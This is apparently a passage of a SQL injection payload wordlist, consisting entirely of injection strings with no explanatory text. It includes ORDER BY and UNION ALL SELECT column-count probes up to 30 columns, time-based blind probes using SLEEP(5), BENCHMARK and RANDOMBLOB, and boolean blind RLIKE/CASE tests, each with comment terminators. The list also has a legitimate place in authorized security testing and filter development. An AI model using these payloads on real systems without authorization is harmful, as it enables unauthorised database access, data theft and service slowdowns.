ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--
ORDER BY 1,SLEEP(5)--
ORDER BY 1--
ORDER BY 10
ORDER BY 10#
ORDER BY 10--
ORDER BY 11
ORDER BY 11#
ORDER BY 11--
ORDER BY 12
ORDER BY 12#
ORDER BY 12--
ORDER BY 13
ORDER BY 13#
ORDER BY 13--
ORDER BY 14
ORDER BY 14#
ORDER BY 14--
ORDER BY 15
ORDER BY 15#
ORDER BY 15--
ORDER BY 16
ORDER BY 16#
ORDER BY 16--
ORDER BY 17
ORDER BY 17#
ORDER BY 17--
ORDER BY 18
ORDER BY 18#
ORDER BY 18--
ORDER BY 19
ORDER BY 19#
ORDER BY 19--
ORDER BY 2
ORDER BY 2#
ORDER BY 2--
ORDER BY 20
ORDER BY 20#
ORDER BY 20--
ORDER BY 21
ORDER BY 21#
ORDER BY 21--
ORDER BY 22
ORDER BY 22#
ORDER BY 22--
ORDER BY 23
ORDER BY 23#
ORDER BY 23--
ORDER BY 24
ORDER BY 24#
ORDER BY 24--
ORDER BY 25
ORDER BY 25#
ORDER BY 25--
ORDER BY 26
ORDER BY 26#
ORDER BY 26--
ORDER BY 27
ORDER BY 27#
ORDER BY 27--
ORDER BY 28
ORDER BY 28#
ORDER BY 28--
ORDER BY 29
ORDER BY 29#
ORDER BY 29--
ORDER BY 3
ORDER BY 3#
ORDER BY 3--
ORDER BY 30
ORDER BY 30#
ORDER BY 30--
ORDER BY 31337
ORDER BY 31337#
ORDER BY 31337--
ORDER BY 4
ORDER BY 4#
ORDER BY 4--
ORDER BY 5
ORDER BY 5#
ORDER BY 5--
ORDER BY 6
ORDER BY 6#
ORDER BY 6--
ORDER BY 7
ORDER BY 7#
ORDER BY 7--
ORDER BY 8
ORDER BY 8#
ORDER BY 8--
ORDER BY 9
ORDER BY 9#
ORDER BY 9--
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)#
ORDER BY SLEEP(5)--
PRINT
PRINT @@variable
RANDOMBLOB(1000000000/2)
RANDOMBLOB(500000000/2)
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
Time-Based:
UNION ALL SELECT
UNION ALL SELECT 'INJ'||'ECT'||'XXX'
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--
UNION ALL SELECT 1
UNION ALL SELECT 1#
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2#
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3#
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4#
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5#
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6#
UNION ALL SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1,2,3,4,5,6,7#
UNION ALL SELECT 1,2,3,4,5,6,7,8
UNION ALL SELECT 1,2,3,4,5,6,7,8#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9
UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
